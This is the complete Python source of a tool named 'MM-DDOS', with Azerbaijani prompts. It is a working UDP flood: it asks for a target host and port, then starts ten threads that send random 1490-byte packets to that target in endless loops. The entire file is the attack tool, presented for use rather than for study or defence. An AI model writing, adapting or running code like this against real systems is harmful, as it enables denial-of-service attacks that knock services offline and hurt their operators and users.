#!/usr/bin/python3
# Developed by: Memmedov53
# MM-DDOS v1.0.0
import os
try:
   from colorama import Fore,init
   init()
except ImportError:
    os.system("pip3 install colorama")
import time
import sys
import socket
import threading
import platform
import random
system = platform.uname()[0]
def title():
    if system == 'Linux':
      os.system("printf '\033]2;MM-DDOS\a'")
    elif system == 'Windows':
        os.system("title MM-DDOS")
    else:
         print("\nPlease, Run This programm on Linux, Windows or MacOS!\n")
         sys.exit()         
def cls():
    if system == 'Windows':
      os.system("cls")
    elif system == 'Linux':
        os.system("clear")
    else:
         print("\nPlease, Run This programm on Linux, Windows or MacOS!\n")
         sys.exit()
class color:
    red = '\033[91m'
    green = '\033[92m'
    End = '\033[0m'
    blue = '\033[33m'
def menu():
    title()
    cls()
    print("""███╗   ███╗███╗   ███╗      ██████╗ ██████╗  ██████╗ ███████╗
████╗ ████║████╗ ████║      ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
██╔████╔██║██╔████╔██║█████╗██║  ██║██║  ██║██║   ██║███████╗
██║╚██╔╝██║██║╚██╔╝██║╚════╝██║  ██║██║  ██║██║   ██║╚════██║
██║ ╚═╝ ██║██║ ╚═╝ ██║      ██████╔╝██████╔╝╚██████╔╝███████║
╚═╝     ╚═╝╚═╝     ╚═╝      ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
                                                             
          ----[    Developed by: Memmedov53   ]---
        -------[ github :""" + color.blue + """ https://github.com/Memmedov53]-----------""" + color.End)
    host = input("\nHost daxil edin: ")
    time.sleep(1)
    port = int(input("\nHədəf portu daxil edin: "))
    ##################################################
    UDP_PORT = port
    bs = random._urandom(1490)
    time.sleep(1)
    cls()
    ip = socket.gethostbyname(host)
    print(color.red + "=============================================================================\n" + color.End)
    print("Hədəf IP:", ip)
    time.sleep(1)
    print("\nHədəf port:", UDP_PORT)
    print(color.red + "=============================================================================\n" + color.End)
    time.sleep(2)
    sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    def run(k):
        while True:
            sock.sendto(bs,(ip,port))
            print(f"{Fore.GREEN}Paket göndərilir. {Fore.RED}{ip}{Fore.WHITE}")
            
    for i in range(10):
        ch = threading.Thread(target=run, args=[i])
        ch.start()
if __name__ == '__main__':
    try:
        try:
           menu()
        except EOFError:
            print("\nCtrl + D")
            print("\nÇixin...")
            sys.exit()
    except KeyboardInterrupt:
        print("\nCtrl + C")
        print("\nÇixin...")
        sys.exit()
# İstifadəyə görə təşəkkür edirəm :)
